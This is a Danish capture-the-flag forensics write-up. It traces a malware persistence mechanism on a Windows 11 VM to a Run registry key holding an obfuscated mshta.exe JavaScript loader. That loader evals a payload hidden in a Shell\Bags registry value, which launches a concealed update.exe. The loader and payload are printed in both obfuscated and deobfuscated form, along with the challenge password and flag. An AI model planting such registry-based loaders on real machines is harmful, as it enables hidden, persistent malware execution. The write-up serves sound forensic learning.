---
title: Persistance is key
ctf: DDC Qualifiers
challenge_name: Persistance is key
category: Forensics
date: 2026-03-23
tags:
  - ctf
  - writeup
  - Forensics
status: draft
tools: []
techniques: []
vuln: ""
slug: persistance-is-key
---

## Challenge beskrivelse

Jeg hentede et lille gratis program og min PC begyndte at opføre sig mærkligt.  
Så slettede det hurtigt igen, men det havde ingen effekt..

Har jeg fået virus? 😱

Hjælp! 😭 Hvorfor virker genstart ikke?

## Challenge handout
Windows 11 VM.
## Løsning af challenge

Givet var en Windows 11 VM. Først blev VM'en importeret i Virtualbox, da VMware ikke formåede at starte den op korrekt. 

![[VM_screenshot.png]]


Da beskrivelsen nævner en genstart ikke hjælper, samt at nogle tilfældige .txt filer pludseligt opstår sammen med lommeregneren, så blev de to destinationer tjekket i registeringseditoren: 
`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`, da dette indikerer at et eller flere programmer automatisk bliver eksekveret ved opstart. 

Den første destination gav ikke noget interessant, dog gav den anden destination dette:


| Name     | Type   | Data                                                                        |
| :------- | :----- | :-------------------------------------------------------------------------- |
| System32 | Reg_SZ | mshta.exe "javascript:var s1="HKCU\\";var s2="Software\\";var gfd="1";var.. |
I data-kolonnen var et Powershell script: 

```powershell
mshta.exe "javascript:
var s1="HKCU\\";
var s2="Software\\";
var s3="Microsoft\\";
var s4="Windows\\";
var s5="Shell\\";
var s6="Bags\\";
var gfd="1";
var s7=gfd+"\\";
var s8="Desktop\\";
var s9="Profile"+gfd;
var a4fh4r = eval;
xo6=new%20ActiveXObject("WScript.Shell");
A8nnnngfg=xo6.RegRead(s1+s2+s3+s4+s5+s6+s7+s8+s9);a4fh4r(A8nnnngfg);
close();"
```

``mshta.exe`` står for Microsoft HTML Application og er en applikation brugt til at parse .hta filer. 
Dernæst ses det at den parserer obfuskeret Javascript, som bliver eksekveret. Ved at deobfuskere dette bliver det meget tydeligt hvad programmet gør: 

```powershell
mshta.exe "javascript: eval(new%20ActiveXObject('WScript.Shell').RegRead('HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop\\Profile1'))"
```

Den læser registerværdien liggende i `HKCU\Software\Microsoft\Windows\Shell\Bags\1\Desktop`. Efter at have tjekket lokationen, så findes Profile1's data:
```powershell
new ActiveXObject("WScript.Shell").Run("%APPDATA%\\discord\\update.exe",0,true)
```
Samt blev der fundet en anden interessant registertype kaldt "Secret_password" med værdien `xSbRFPNuKpLeguYhiCAFcddbchSQMY`. 

Profile1 eksekverer altså en fil kaldt "update.exe". Dernæst blev den fil overført til en anden VM med Kali Linux kørende.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ file update.exe 
update.exe: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified May 23 2025 09:42:12, uncompressed size 112174, method=deflate
```

"update.exe" er altså en zip fil/indeholder en zip fil. Samt blev et kodeord fundet tidligere. I zipfilen lå en .png
![[CTF/DDC Qualifiers/flag.png]]
Dette gav flaget: DDC{M4gnific3nt-M4lwar3-R3mov4}
